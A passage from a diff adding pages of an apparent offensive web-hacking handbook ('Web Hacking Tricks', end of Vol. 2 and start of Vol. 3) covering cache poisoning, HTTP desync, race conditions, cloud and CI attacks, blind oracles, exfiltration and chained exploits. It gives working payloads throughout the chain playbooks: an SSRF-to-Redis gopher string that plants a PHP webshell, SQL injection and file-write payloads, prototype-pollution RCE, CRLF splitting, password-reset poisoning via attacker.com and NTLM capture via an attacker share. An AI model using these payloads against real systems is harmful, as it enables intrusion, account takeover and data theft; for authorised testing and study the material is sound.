+<p>If the origin builds an absolute URL or a <code>Location</code> from it, the cached copy redirects everyone.</p>
+<p>More exotic:</p>
+<ul>
+<li><strong>Cache key injection</strong>: ambiguous key boundaries (delimiters, <code>;</code>, <code>%00</code>, duplicate query params) map two requests to one entry. (<a href="https://www.yeswehack.com/lab/research-cache-key-injection">Cache key injection</a>)</li>
+<li><strong>Framework internals</strong>: Next.js <code>x-now-route-matches</code> + <code>__nextDataReq</code> store <code>pageProps</code> JSON under an HTML key. (<a href="https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir">stale elixir</a>)</li>
+<li><strong>Type confusion</strong>: a cached RSC response re-rendered as HTML because <code>Vary</code> ignores <code>Content-Type</code>. (<a href="https://zhero-web-sec.github.io/research-and-things/re-cache-excessive-reflection-type-confusion-and-0-click-sxss-on-nextjs">Re:CACHE</a>)</li>
+<li><strong>Cache the <code>Location</code></strong>: CL.0 desync poisons a redirect header, giving a covert channel. (<a href="https://blog.malicious.group/the-quiet-side-channel-smuggling-with-cl-0-for-c2/">Quiet Side Channel</a>)</li>
+<li><strong>Conditional poisoning</strong>: <code>If-None-Match</code>/<code>If-Modified-Since</code> make the cache store a 304 for a URL that later needs a 200.</li>
+</ul>
+<h3 id="102-deception">10.2 Deception</h3>
+<p>Append a static-looking suffix to a dynamic, authenticated page. The cache stores it under the static key; you fetch it unauthenticated.</p>
+<pre><code>/account/logo.png
+/account/..%2faccount
+/account;.css
+/account%00.css
+/account/logo.avif
+</code></pre>
+<p>The <code>%2f</code> and <code>..%2f</code> variants survive caches that decode and normalize differently from the origin — that was the ChatGPT ATO. (<a href="https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html">Wildcard Web Cache Deception</a>)</p>
+<h3 id="103-cache-as-a-side-channel">10.3 Cache as a side channel</h3>
+<ul>
+<li>Hit/miss timing tells you whether a URL is cached → whether a victim visited it.</li>
+<li><code>Age</code> header presence, <code>X-Cache: HIT</code>.</li>
+<li>ETag length as a cross-site length oracle. (<a href="https://blog.arkark.dev/2025/12/26/etag-length-leak">ETag leak</a>)</li>
+</ul>
+<h3 id="104-cache-as-storage">10.4 Cache as storage</h3>
+<p>Poison a URL with your payload, then reference it from a context that trusts the origin. Cache entries persist after the origin is fixed, which is useful for stored XSS on a trusted domain.</p>
+<hr />
+<h2 id="11-http-desync">11. HTTP desync</h2>
+<p>Desync is the most powerful server-side primitive and the most misunderstood. It is not "send two requests"; it is <strong>make two parsers disagree about where a body ends</strong>.</p>
+<h3 id="111-variants">11.1 Variants</h3>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>Front end</th>
+<th>Back end</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CL.TE</td>
+<td><code>Content-Length</code></td>
+<td><code>Transfer-Encoding</code></td>
+</tr>
+<tr>
+<td>TE.CL</td>
+<td><code>Transfer-Encoding</code></td>
+<td><code>Content-Length</code></td>
+</tr>
+<tr>
+<td>TE.TE</td>
+<td>obfuscated TE</td>
+<td>different obfuscation handling</td>
+</tr>
+<tr>
+<td>CL.0</td>
+<td><code>Content-Length</code></td>
+<td>ignores body</td>
+</tr>
+<tr>
+<td>TE.0</td>
+<td><code>Transfer-Encoding</code></td>
+<td>ignores body</td>
+</tr>
+<tr>
+<td>H2.CL / H2.TE</td>
+<td>HTTP/2</td>
+<td>HTTP/1.1 downgrade</td>
+</tr>
+</tbody>
+</table>
+<p>Obfuscations: <code>Transfer-Encoding: chunked, chunked</code>, <code>xchunked</code>, <code>Transfer-Encoding : chunked</code>, <code>Transfer-Encoding:\tchunked</code>, duplicate TE, <code>Content-Length: 5, 5</code>.</p>
+<h3 id="112-chunk-parsing-quirks">11.2 Chunk parsing quirks</h3>
+<ul>
+<li>A bare <code>\n</code> inside a chunk extension: one parser ends the line, the other swallows it.</li>
+<li>Two bytes blindly skipped as the chunk terminator: one parser consumes a byte of the next size.</li>
+<li>A bare newline in the trailer section splits the same way.</li>
+<li>Oversized chunk sizes and <code>0x</code> prefixes.</li>
+</ul>
+<p>(<a href="https://w4ke.info/2025/06/18/funky-chunks.html">Funky chunks</a>, <a href="https://w4ke.info/2025/10/29/funky-chunks-2.html">addendum</a>)</p>
+<h3 id="113-crlf-in-the-path">11.3 CRLF in the path</h3>
+<p>When <code>proxy_pass</code> includes <code>$uri</code>, Nginx normalizes and URL-decodes it, so <code>%0d%0a</code> in the path injects headers or a whole request upstream. Adding <code>Transfer-Encoding</code> next to the real <code>Content-Length</code> gives a CL.TE; two CRLFs split the request for response-queue poisoning. (<a href="https://portswigger.net/research/crlf-powered-desync-attacks">CRLF-Powered Desync</a>)</p>
+<h3 id="114-http2-and-http3">11.4 HTTP/2 and HTTP/3</h3>
+<ul>
+<li><strong>H2.CL</strong>: a <code>content-length</code> header that disagrees with the actual <code>DATA</code> length, downgraded to H1.</li>
+<li><strong>H2 CONNECT</strong>: tunnels multiplexed on one stream — fast internal port scanning through a proxy. (<a href="https://blog.flomb.net/posts/http2connect/">Playing with HTTP/2 CONNECT</a>)</li>
+<li><strong>H3 FIN</strong>: a standalone QUIC FIN ends an H3 body without the DATA length check, so the backend reads the next request as body. (<a href="https://r3verii.github.io/cve/2026/04/14/haproxy-h3-standalone-fin-smuggling.html">CVE-2026-33555</a>)</li>
+<li><strong>Connection contamination</strong>: coalesced H2/H3 connections to a shared IP+cert, plus a proxy that picks the backend from the first request, misroutes everything after. (<a href="https://portswigger.net/research/http-3-connection-contamination">HTTP/3 connection contamination</a>)</li>
+</ul>
+<h3 id="115-exploitation-outcomes">11.5 Exploitation outcomes</h3>
+<ul>
+<li><strong>Bypass front-end controls</strong>: reach an admin path the proxy blocks, skip rate limits, skip auth on the second request.</li>
+<li><strong>Capture other users' requests</strong>: the classic prefix attack.</li>
+<li><strong>Response queue poisoning</strong>: misalign responses so you receive someone else's.</li>
+<li><strong>Cache poisoning</strong> via the smuggled prefix.</li>
+<li><strong>Tunnelling</strong>: smuggle a request to an internal host through a whitelisted front end — this is how XXE behind an egress firewall still exfiltrates. (<a href="https://honoki.net/2020/03/18/xxe-scape-through-the-front-door-circumventing-the-firewall-with-http-request-smuggling/">XXE-scape</a>)</li>
+<li><strong>Client-side desync</strong>: the <em>browser</em> holds the poisoned connection, so the next request the victim's browser makes is the attack. (<a href="https://blog.jeti.pw/posts/knocking-on-the-front-door/">client-side desync</a>)</li>
+</ul>
+<h3 id="116-making-it-reliable">11.6 Making it reliable</h3>
+<p>Desync is a race. The single-packet attack sends all requests in one TCP segment (or one QUIC packet) so the server processes them simultaneously; last-byte sync withholds the final byte of each. This turns a ~1/2000 race into ~80% hits. (<a href="https://www.assured.se/posts/the-single-packet-shovel-desync-powered-request-tunnelling">Single-Packet Shovel</a>, <a href="https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/">Beyond the Limit</a>)</p>
+<hr />
+<h2 id="12-race-conditions">12. Race conditions</h2>
+<h3 id="121-the-real-class">12.1 The real class</h3>
+<p>Not just "double-spend". Every request passes through hidden sub-states, and two requests in the same millisecond can force an illegal transition:</p>
+<ul>
+<li>Confirm an email you do not own by racing the confirm and the email change</li>
+<li>Redeem a coupon/invite twice</li>
+<li>Bypass a limit by racing the counter</li>
+<li>Register the same username twice, then take over the first</li>
+<li>Race <code>/proc/self/fd</code> between <code>stat</code> and <code>open</code> to read a file whose length check fails</li>
+<li>Race a symlink between check and use (TOCTOU)</li>
+<li>Race an upload's temporary file against a parser</li>
+</ul>
+<h3 id="122-database-level-races">12.2 Database-level races</h3>
+<p>Read-check-write inside a transaction is still racy at default isolation — the read takes no lock. Parallel requests all pass the check. (<a href="https://blog.doyensec.com/2024/07/11/database-race-conditions.html">A Race to the Bottom</a>)</p>
+<h3 id="123-tools">12.3 Tools</h3>
+<p>Turbo Intruder single-packet, <code>race-the-web</code>, HTTP/3 single-datagram, and a plain <code>xargs -P</code> for wide windows. Always send a control pair serially to prove the difference.</p>
+<hr />
+<h2 id="13-dos-as-a-chain-element">13. DoS as a chain element</h2>
+<p>DoS is under-used as a <em>component</em>:</p>
+<ul>
+<li><strong>Header loss</strong>: PHP <code>max_input_vars</code> overflow emits a warning before headers → no CSP, no <code>Content-Type</code>, no <code>Cache-Control</code>. Combined with injection that is an XSS.</li>
+<li><strong>Force an error page</strong>: cookie bomb, overlong URL, WAF trigger — error pages often lack <code>nosniff</code> and CSP.</li>
+<li><strong>Widen a race window</strong>: expensive regex or a slow query in one branch makes the other branch win.</li>
+<li><strong>Evict a cache</strong>: fill the cache past its limit to force LRU eviction and claim the entry. (<a href="https://adnanthekhan.com/posts/angular-compromise-through-dev-infra">Angular compromise</a>)</li>
+<li><strong>Exhaust a worker pool</strong>: reserve all PHP-FPM workers so a request lands in a predictable one.</li>
+</ul>
+<p>Specific amplifiers: ReDoS, HPACK bomb, HTTP/2 CONTINUATION flood, Rapid Reset, MadeYouReset, slow JSON stream, decompression bomb, nested FormData rescan, algorithmic complexity in sort/hash.</p>
+<hr />
+<h2 id="14-cloud-container-orchestration">14. Cloud, container, orchestration</h2>
+<ul>
+<li><strong>Metadata</strong> (§1.5) → IAM creds → the cloud API is now your shell.</li>
+<li><strong>Kubelet <code>:10250</code></strong>: <code>/pods</code>, <code>/run/&lt;ns&gt;/&lt;pod&gt;/&lt;container&gt;</code> — <code>nodes/proxy</code> GET alone authorizes a WebSocket to <code>/exec</code>. (<a href="https://grahamhelton.com/blog/nodes-proxy-rce">Graham Helton</a>)</li>
+<li><strong>Docker socket</strong> <code>/var/run/docker.sock</code> or <code>:2375</code>: create a container with <code>--privileged -v /:/host</code>.</li>
+<li><strong>Podman <code>:2375</code></strong> reachable from a <em>website</em> via browser-simple POSTs. (<a href="https://www.proofnet.de/publikationen/podman_tcp_api.html">proofnet</a>)</li>
+<li><strong>containerd</strong>, <strong>CRI-O</strong>, <strong>buildkit</strong> sockets.</li>
+<li><strong>etcd <code>:2379</code></strong> (all secrets), <strong>Consul <code>:8500</code></strong>, <strong>Vault <code>:8200</code></strong>, <strong>Nomad <code>:4646</code></strong>.</li>
+<li><strong>Ingress controllers</strong>: annotation values injected into config unsanitized → <code>ssl_engine</code> + a smuggled <code>.so</code>. (<a href="https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities">IngressNightmare</a>)</li>
+<li><strong>CI OIDC</strong>: <code>sub</code> claims built from a re-registerable namespace — delete and recreate the repo path to mint an identical <code>sub</code>. (<a href="https://astrix.security/learn/blog/subjugation-hijacking-cloud-identities-by-recycling-namespaces-in-global-oidc-issuers/">Sub:jugation</a>)</li>
+<li><strong>Abandoned cloud storage</strong>: re-register a dangling S3 bucket still referenced by installers and pipelines. (<a href="https://labs.watchtowr.com/8-million-requests-later-we-made-the-solarwinds-supply-chain-attack-look-amateur/">watchTowr</a>)</li>
+<li><strong>Load balancer rule intersections</strong>: an alternate listener bypasses source-IP or CDN restrictions. (<a href="https://blog.doyensec.com/2026/05/25/cloudsectidbits-elbaph-alb.html">ELBaph</a>)</li>
+</ul>
+<hr />
+<h2 id="15-supply-chain-and-ci">15. Supply chain and CI</h2>
+<ul>
+<li><strong><code>pull_request_target</code> + checkout of the PR head</strong>: the workflow runs with secrets and the PR's code.</li>
+<li><strong>Expression injection</strong>: <code>${{ github.head_ref }}</code> in a <code>run:</code> step — a branch name executes shell.</li>
+<li><strong>Environment creation</strong>: naming a non-existent environment in a fork PR makes GitHub create it and fire <code>deployment_status</code> into the default branch's workflow with secrets. (<a href="https://labs.boostsecurity.io/articles/deployment_poisoning">Deployment Poisoning</a>)</li>
+<li><strong>Cache poisoning</strong>: fill the 10 GB cache to force eviction, then claim the entry the release job will restore.</li>
+<li><strong>Artifact leakage</strong>: <code>actions/checkout</code> persists <code>GITHUB_TOKEN</code> in <code>.git</code>; uploading the workspace publishes it.</li>
+<li><strong>Prompt injection into CI agents</strong>: issue/PR text pasted into an LLM with a write token.</li>
+<li><strong>Dependency confusion</strong> and typosquatting against internal scopes.</li>
+<li><strong>Trusted-publisher abuse</strong>: a trusted workflow <em>filename</em> on an untrusted branch still publishes. (<a href="https://labs.boostsecurity.io/articles/trusted-publishing-untrusted-branch-red-hat-npm">Red Hat npm</a>)</li>
+</ul>
+<hr />
+<h2 id="16-primitive-hygiene">16. Primitive hygiene</h2>
+<p>Before you escalate, verify:</p>
+<ol>
+<li><strong>Is it real?</strong> A control request without the payload, from a different connection, same result?</li>
+<li><strong>Is it stable?</strong> Three consecutive confirmations.</li>
+<li><strong>Is it yours?</strong> Another tester's cache entry, another user's session, a shared worker.</li>
+<li><strong>What is the blast radius?</strong> Read-only, write, execute, cross-tenant.</li>
+<li><strong>Can you undo it?</strong> Especially for writes, cache poison, and DNS.</li>
+</ol>
+<p><strong>Next:</strong> Vol. 3 — Oracles, Chains, Tooling.</p>
+<hr />
+<h1 id="web-hacking-tricks-vol-3-oracles-chains-tooling">Web Hacking Tricks, Vol. 3 — Oracles, Chains, Tooling</h1>
+<blockquote>
+<p>Vol. 1 gave you differentials. Vol. 2 gave you primitives. This volume turns a primitive into a confirmed, reportable impact.</p>
+</blockquote>
+<hr />
+<h2 id="1-building-oracles">1. Building oracles</h2>
+<p>A blind primitive without an oracle is a guess. Build the oracle <em>first</em>, then spend the primitive.</p>
+<h3 id="11-oracle-selection">1.1 Oracle selection</h3>
+<table>
+<thead>
+<tr>
+<th>Situation</th>
+<th>Oracle to build</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Response body differs at all</td>
+<td>Substring match on a known-good vs known-bad byte</td>
+</tr>
+<tr>
+<td>Body fixed, status varies</td>
+<td>Status code (200/302/500)</td>
+</tr>
+<tr>
+<td>Body and status fixed</td>
+<td><code>Content-Length</code> delta</td>
+</tr>
+<tr>
+<td>Length fixed too</td>
+<td>Timing (add <code>sleep</code>, expensive regex, large sort)</td>
+</tr>
+<tr>
+<td>No response at all</td>
+<td>OOB: DNS, HTTP callback, SMB</td>
+</tr>
+<tr>
+<td>Output truncated</td>
+<td>Binary search on prefix, or sort/order</td>
+</tr>
+<tr>
+<td>Output digits only</td>
+<td>Base-N encode then chunk into an integer</td>
+</tr>
+<tr>
+<td>Cross-origin</td>
+<td>Cache hit/miss, frame count, <code>onload</code>, ETag length</td>
+</tr>
+</tbody>
+</table>
+<h3 id="12-boolean-oracles">1.2 Boolean oracles</h3>
+<p>Make the condition the <em>whole</em> query, not a suffix:</p>
+<pre><code>' AND (SELECT substr(secret,1,1) FROM t)='a' AND '1'='1
+</code></pre>
+<p>Prefer <code>substr</code> + <code>=</code> over <code>LIKE</code> (wildcards in the secret break <code>LIKE</code>). Prefer a <strong>binary search</strong> over an alphabet scan: <code>ascii(substr(...))&gt;127</code>.</p>
+<h3 id="13-error-oracles">1.3 Error oracles</h3>
+<p>Force a type error only when the predicate is true:</p>
+<pre><code>1/(SELECT 1 FROM t WHERE substr(secret,1,1)='a')
+CAST((SELECT ...) AS int)
+</code></pre>
+<p>Error oracles survive output buffering and are the fastest per request. They die to <code>display_errors=Off</code> and generic error pages — check first.</p>
+<h3 id="14-timing-oracles">1.4 Timing oracles</h3>
+<p>Only when nothing else works. Ten samples per state, take the median, use a 3× margin. Amplify with nested work (<code>pg_sleep(2)</code>, <code>BENCHMARK(10^7,MD5(1))</code>, a catastrophic regex, a large <code>ORDER BY</code>).</p>
+<h3 id="15-sort-and-order-oracles">1.5 Sort and order oracles</h3>
+<p>Insert the target as a hidden participant in a sort you control, then read relative position from a probe row. Works where the value itself is never returned. (<a href="https://bugcrowd.com/disclosures/0ecb51a3-2064-4f9d-aa19-aa7b6ae21812">Trello</a>)</p>
+<h3 id="16-length-oracles">1.6 Length oracles</h3>
+<p><code>Content-Length</code> differences, ETag hex length stepping across a digit boundary, compressed-size deltas, padding that pushes a header past a limit into a 431. (<a href="https://blog.arkark.dev/2025/12/26/etag-length-leak">ETag length leak</a>)</p>
+<h3 id="17-cross-site-oracles">1.7 Cross-site oracles</h3>
+<ul>
+<li><code>window.length</code> (frame count), <code>onload</code>/<code>onerror</code>, <code>performance</code> timing</li>
+<li>Cache hit (<code>Age</code>, <code>X-Cache</code>, timing)</li>
+<li>CORB/ORB behaviour: a JSON response errors as a script, HTML loads</li>
+<li>Redirect race ordering by port/scheme/host (<a href="https://blog.babelo.xyz/posts/cross-site-subdomain-leak/">XSS-Leak</a>)</li>
+<li>CSS: attribute selectors + <code>background:url()</code> for character extraction; <code>@font-face</code> <code>descent-override</code> + animation for a height oracle when requests are blocked (<a href="https://portswigger.net/research/css-the-bomb-inside-your-inbox">CSS: the bomb inside your inbox</a>)</li>
+</ul>
+<h3 id="18-oob-channels-ranked">1.8 OOB channels, ranked</h3>
+<ol>
+<li><strong>DNS</strong> — survives almost every egress filter, cheap, works from SQL/XXE/command/SSTI. Use a unique label per bit.</li>
+<li><strong>HTTP(S)</strong> to your host — blocked more often; try 80/443/8080/8443.</li>
+<li><strong>SMB</strong> — also yields NTLM hashes.</li>
+<li><strong>FTP</strong> — for XXE on Windows (multi-line via UNC).</li>
+<li><strong>The target's own logs</strong> — write the secret into a log you can read back.</li>
+<li><strong>A cache entry</strong> — store the secret under a URL you can fetch.</li>
+<li><strong>A public paste/issue/comment</strong> — when you have an account.</li>
+</ol>
+<hr />
+<h2 id="2-exfiltration-under-constraints">2. Exfiltration under constraints</h2>
+<h3 id="21-numeric-only-output">2.1 Numeric-only output</h3>
+<p>Encode to base-36 (alphanumeric) or base-27 (letters+space), then express as one large base-10 integer and chunk. (<a href="https://blog.ikaes.de/exfiltration-using-numeric-only-outputs/">numeric-only exfil</a>)</p>
+<h3 id="22-fixed-width-or-truncated-output">2.2 Fixed-width or truncated output</h3>
+<p>Send one character per request with a prefix binary search. If the prefix itself is cut, rotate the offset.</p>
+<h3 id="23-no-output-no-egress">2.3 No output, no egress</h3>
+<ul>
+<li>Write to a file you can then read (two primitives).</li>
+<li>Write into a cache entry.</li>
+<li>Encode into a <code>Location</code> header you can observe via a redirect chain.</li>
+<li>Encode into response time.</li>
+<li>Encode into status code (multi-valued alphabet).</li>
+</ul>
+<h3 id="24-size-limits">2.4 Size limits</h3>
+<p>Chunk at 30–60 bytes per request, base64 the payload, compress first (<code>gzip | base64</code>) and decompress locally. For DNS, 63 bytes per label and ~253 per name.</p>
+<hr />
+<h2 id="3-chain-playbooks">3. Chain playbooks</h2>
+<p>Each is a composition, not a single bug. Read the <em>shape</em>, then map it onto the target.</p>
+<h3 id="31-ssrf-cloud-rce">3.1 SSRF → cloud → RCE</h3>
+<pre><code>URL fetch → 169.254.169.254 (or metadata.google.internal/v1beta1)
+→ role name → credentials JSON
+→ aws sts get-caller-identity → enumerate
+→ ssm send-command | lambda update-code | create-instance with user-data
+</code></pre>
+<p>Pivot points: IMDSv2 via a redirect that adds headers, or an internal proxy. (<a href="https://hackerone.com/reports/341876">#341876</a>)</p>
+<h3 id="32-ssrf-redis-webshell">3.2 SSRF → Redis → webshell</h3>
+<pre><code>gopher://127.0.0.1:6379/_CONFIG SET dir /var/www/html%0d%0aCONFIG SET dbfilename s.php%0d%0aSET x &quot;&lt;?php system($_GET[c]);?&gt;&quot;%0d%0aSAVE
+</code></pre>
+<p>Then request <code>/s.php?c=id</code>. If Redis runs as a different user, check the webroot is writable first.</p>
+<h3 id="33-ssrf-fastcgi-rce">3.3 SSRF → FastCGI → RCE</h3>
+<p>gopher to <code>:9000</code>, <code>SCRIPT_FILENAME=/var/www/html/index.php</code>, <code>PHP_VALUE=auto_prepend_file=php://input</code>, then the body is executed.</p>
+<h3 id="34-blind-ssrf-full-read">3.4 Blind SSRF → full read</h3>
+<pre><code>attacker/loop → 302 to attacker/loop2 → ... (status climbs 301→308)
+→ client error path returns the whole chain + final body
+</code></pre>
+<p>(<a href="https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/">redirect loops</a>)</p>
+<h3 id="35-file-read-session-forgery">3.5 File read → session forgery</h3>
+<pre><code>traversal → .env / config.php / appsettings.json
+→ APP_KEY / SECRET_KEY_BASE / machineKey / JWT secret
+→ forge a signed cookie or ViewState → admin
+</code></pre>
+<p>Laravel <code>APP_KEY</code> → <code>phpggc</code> + decrypt/encrypt; Rails <code>SECRET_KEY_BASE</code> → Marshal cookie; Django <code>SECRET_KEY</code> → signed session; ASP.NET <code>machineKey</code> → <code>ysoserial.net</code> ViewState.</p>
+<h3 id="36-file-read-rce-via-wrapper">3.6 File read → RCE via wrapper</h3>
+<pre><code>include($_GET['p']) + php://filter chain → prepend &quot;&lt;?php system($_GET[c]);?&gt;&quot;
+</code></pre>
+<p>(<a href="https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html">PHP filter chains</a>)</p>
+<h3 id="37-file-write-config-rce">3.7 File write → config → RCE</h3>
+<pre><code>upload/write application.properties (Spring) or logback-spring.xml
+→ trigger reload/restart (actuator/refresh, or wait)
+→ logging appender executes a command
+</code></pre>
+<p>(<a href="https://srcincite.io/blog/2024/11/25/remote-code-execution-with-spring-properties.html">Spring properties</a>)</p>
+<h3 id="38-upload-polyglot-parser">3.8 Upload → polyglot → parser</h3>
+<pre><code>valid JPEG + PHP in a comment/EXIF/PLTE chunk
+→ survives re-encoding by GD/Imagick
+→ included or served as PHP
+</code></pre>
+<p>(<a href="https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html">PHP payloads in PNGs</a>, <a href="https://blog.doyensec.com/2020/04/30/polymorphic-images-for-xss.html">polymorphic images</a>)</p>
+<h3 id="39-xxe-ssrf-internal-rce">3.9 XXE → SSRF → internal RCE</h3>
+<pre><code>XXE with a parameter entity to an internal host
+→ internal admin API with no auth → deploy/exec
+</code></pre>
+<p>Behind an egress firewall, add desync tunnelling through a whitelisted host. (<a href="https://honoki.net/2020/03/18/xxe-scape-through-the-front-door-circumventing-the-firewall-with-http-request-smuggling/">XXE-scape</a>)</p>
+<h3 id="310-xxe-ntlm-relay">3.10 XXE → NTLM → relay</h3>
+<p><code>\\attacker\share</code> in the entity → <code>responder</code> captures NTLMv2 → <code>ntlmrelayx</code> to LDAP/SMB → domain account. (<a href="https://techblog.mediaservice.net/2018/02/from-xml-external-entity-to-ntlm-domain-hashes/">XXE to NTLM</a>)</p>
+<h3 id="311-desync-cache-poison-xss">3.11 Desync → cache poison → XSS</h3>
+<pre><code>CL.TE smuggles a prefix that sets a header on the *next* request
+→ victim's request gets the poisoned response from cache
+→ script executes on the trusted origin
+</code></pre>
+<p>Use the single-packet attack for reliability.</p>
+<h3 id="312-desync-auth-bypass">3.12 Desync → auth bypass</h3>
+<p>Smuggle a request to <code>/admin</code> behind the proxy's ACL, or smuggle a second request that inherits your authenticated connection.</p>
+<h3 id="313-cache-deception-token-theft">3.13 Cache deception → token theft</h3>
+<pre><code>victim visits /account/..%2faccount (or /account/logo.png)
+→ cache stores their authenticated page under that key
+→ attacker fetches it → session token / PII
+</code></pre>
+<p>(<a href="https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html">ChatGPT ATO</a>)</p>
+<h3 id="314-content-type-confusion-stored-xss-ato">3.14 Content-type confusion → stored XSS → ATO</h3>
+<pre><code>upload HTML to object storage, override Content-Type to text/html
+→ executes on the bucket origin (often a trusted sibling domain)
+→ read cookies / call the API with credentials
+</code></pre>
+<p>(<a href="https://blog.voorivex.team/content-type-override-to-stored-xss-on-public-objects">Content-Type Override</a>)</p>
+<h3 id="315-cspt-csrf-state-change">3.15 CSPT → CSRF → state change</h3>
+<pre><code>URL segment controls a path the front end concatenates into an API call
+→ ../../other-endpoint reroutes the authenticated request
+→ POST with the victim's cookies despite SameSite
+</code></pre>
+<p>(<a href="https://blog.doyensec.com/2024/07/02/cspt2csrf.html">CSPT2CSRF</a>)</p>
+<h3 id="316-open-redirect-oauth-code-theft">3.16 Open redirect → OAuth code theft</h3>
+<p><code>redirect_uri</code> validated by prefix, then an open redirect on the registered host forwards the <code>?code=</code> to you. Chain with <code>prompt=none</code> for silence.</p>
+<h3 id="317-prototype-pollution-gadget-rce">3.17 Prototype pollution → gadget → RCE</h3>
+<pre><code>{&quot;__proto__&quot;:{&quot;shell&quot;:&quot;/proc/self/exe&quot;,&quot;NODE_OPTIONS&quot;:&quot;--require /tmp/x.js&quot;}}
+→ child_process spawn picks up the polluted option
+</code></pre>
+<p>(<a href="https://arxiv.org/abs/2207.11171">Silent Spring</a>, <a href="https://www.usenix.org/conference/usenixsecurity24/presentation/cornelissen">GHunter</a>)</p>
+<h3 id="318-sqli-file-write-rce">3.18 SQLi → file write → RCE</h3>
+<pre><code>INTO OUTFILE '/var/www/html/s.php'   (MySQL, secure_file_priv='')
+lo_export / COPY ... TO PROGRAM      (Postgres)
+BACKUP ... TO DISK + xp_cmdshell     (MSSQL)
+</code></pre>
+<h3 id="319-sqli-credential-lateral">3.19 SQLi → credential → lateral</h3>
+<p>Dump the users table → crack or pass-the-hash → reuse on the admin panel, VPN, or CI.</p>
+<h3 id="320-subdomain-takeover-cookie-toss-session-fixation">3.20 Subdomain takeover → cookie toss → session fixation</h3>
+<pre><code>dangling CNAME → claim the host → set Domain=parent cookie with Path=/oauth
+→ victim's OAuth callback uses your session → then you log in
+</code></pre>
+<p>(<a href="https://snyk.io/articles/hijacking-oauth-flows-via-cookie-tossing/">Cookie tossing</a>)</p>
+<h3 id="321-host-header-reset-poisoning">3.21 Host header → reset poisoning</h3>
+<pre><code>POST /forgot-password  Host: attacker.com  (or X-Forwarded-Host)
+→ mail contains https://attacker.com/reset?token=...
+→ victim clicks → token leaks
+</code></pre>
+<h3 id="322-crlf-response-splitting-cache-poison">3.22 CRLF → response splitting → cache poison</h3>
+<pre><code>/u%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK...
+</code></pre>
+<p>Nest a second splitting payload inside the injected script <code>src</code> to satisfy <code>script-src 'self'</code>. (<a href="https://lab.ctbb.show/research/crlf-injection-nested-response-splitting-csp-gadget">CRLF nested CSP gadget</a>)</p>
+<h3 id="323-debug-endpoint-env-rce">3.23 Debug endpoint → env → RCE</h3>
+<p><code>/actuator/env</code>, <code>/debug</code>, <code>/__debug__</code>, <code>/server-status</code>, <code>/.git/config</code>, <code>/graphql</code> introspection, <code>/swagger-ui</code>. Env vars → cloud creds or a writable config path.</p>
+<h3 id="324-race-double-spend-duplicate-identity">3.24 Race → double spend / duplicate identity</h3>
+<p>Single-packet N requests to the redeem endpoint; compare with a serial control.</p>
+<h3 id="325-dos-header-loss-xss">3.25 DoS → header loss → XSS</h3>
+<p>Overflow <code>max_input_vars</code> so headers are never sent, then inject into a page that now has no CSP and no <code>nosniff</code>.</p>
+<hr />
+<h2 id="4-feature-checklists">4. Feature checklists</h2>
+<h3 id="41-upload">4.1 Upload</h3>
+<ul>
+<li>Extension allowlist vs sniffer vs server handler; <code>.php5</code>, <code>.phtml</code>, <code>.pht</code>, <code>.phar</code>, <code>.jspx</code>, <code>.ashx</code>, <code>.svg</code>, <code>.html</code></li>
+<li>Double extension, trailing dot/space, <code>%00</code>, case, <code>::$DATA</code> (Windows)</li>
+<li>Content-Type supplied by the client and trusted</li>
+<li>Filename → path join; traversal; absolute path</li>
+<li>Image reprocessing (survives?), EXIF retained?, metadata stripped?</li>
+<li>Where is it stored — webroot, CDN, object storage, temp?</li>
+<li>Is the stored name predictable? Is the directory listable?</li>
+<li>Archive extraction: zip slip, symlink, nested archive, decompression bomb</li>
+<li>SVG: scripts, <code>xlink:href</code>, external entities, <code>use</code>/<code>import</code></li>
+<li>Office/PDF: macros, external refs, OLE, XFA, embedded files</li>
+</ul>
+<h3 id="42-url-fetch-import">4.2 URL fetch / import</h3>
+<ul>
+<li>Scheme allowlist; <code>file://</code>, <code>gopher://</code>, <code>dict://</code>, <code>ftp://</code>, <code>phar://</code></li>
+<li>Redirect following and re-validation</li>
+<li>DNS resolution timing (rebind)</li>
+<li>Response size cap, timeout, content-type validation</li>
+<li>Is the body returned, rendered, or parsed?</li>
+<li>Does it store the fetched bytes (→ stored XSS)?</li>
+<li>Auth headers forwarded to the new host?</li>
+</ul>
+<h3 id="43-pdf-image-document-generation">4.3 PDF / image / document generation</h3>
+<ul>
+<li>HTML injection into the renderer → SSRF, file read, local file inclusion in the PDF</li>
+<li><code>file://</code> and <code>@font-face</code> with a local path</li>
+<li>Remote font from a <code>.php</code> URL (cache poisoning to RCE)</li>
+<li>Attachment filename → <code>Content-Disposition</code></li>
+<li>PDF JavaScript, launch actions, submit actions</li>
+<li>Ghostscript/ImageMagick delegate reachable from the content</li>
+</ul>
+<h3 id="44-webhook-callback">4.4 Webhook / callback</h3>
+<ul>
+<li>URL validation, redirect, DNS rebind</li>
+<li>Signature verification (and whether it is checked before parsing)</li>
+<li>Retry behaviour (replay), response body parsed?</li>
+<li>Can you point it at an internal host and read the error?</li>
+</ul>
+<h3 id="45-export-report">4.5 Export / report</h3>
+<ul>
+<li>CSV formula injection</li>
+<li>Column selection → ORM leak</li>
+<li>Filename from user input</li>
+<li>Format selection (<code>format=pdf|xlsx|csv</code>) → different renderers</li>
+<li>Large export → worker, temp file, predictable path</li>
+</ul>
+<h3 id="46-sso-oauth">4.6 SSO / OAuth</h3>
+<ul>
+<li><code>redirect_uri</code> matching mode (exact, prefix, regex, wildcard)</li>
+<li><code>state</code>, PKCE, nonce binding</li>
+<li><code>prompt</code>, <code>response_type</code>, <code>response_mode</code> tampering</li>
+<li>Account linking by email</li>
+<li><code>jwks_uri</code>, <code>logo_uri</code>, <code>request_uri</code> fetch</li>
+<li>Logout / reauth flows</li>
+<li>Token audience and scope validation</li>
+</ul>
+<h3 id="47-admin-panel">4.7 Admin panel</h3>
